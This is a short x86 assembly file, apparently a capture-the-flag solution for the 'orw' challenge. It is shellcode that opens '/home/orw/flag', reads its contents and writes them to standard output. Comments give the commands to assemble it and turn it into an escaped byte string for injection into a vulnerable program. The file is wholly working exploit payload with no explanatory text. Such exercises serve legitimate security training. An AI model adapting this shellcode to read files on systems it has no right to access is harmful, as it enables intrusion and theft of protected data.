BITS 32

	push 0
	push "flag"
	push "orw/"
	push "e///"
	push "/hom"

	xor edx, edx
	xor ecx, ecx
	xor eax, eax
	mov ebx, esp
	mov eax, 5	
	int 0x80

	mov edx, 40
	mov ecx, esp
	mov ebx, eax
	mov eax, 3
	int 0x80

	mov edx, 40
	mov ecx, esp
	mov ebx, 1
	mov eax, 4
	int 0x80

	xor ebx, ebx
	mov eax, 1
	int 0x80

;; nasm orw.S -o shell.bin
;; hexdump -v -e '1/1 "\\"' -e '1/1 "x%02x"' shell.bin ; echo
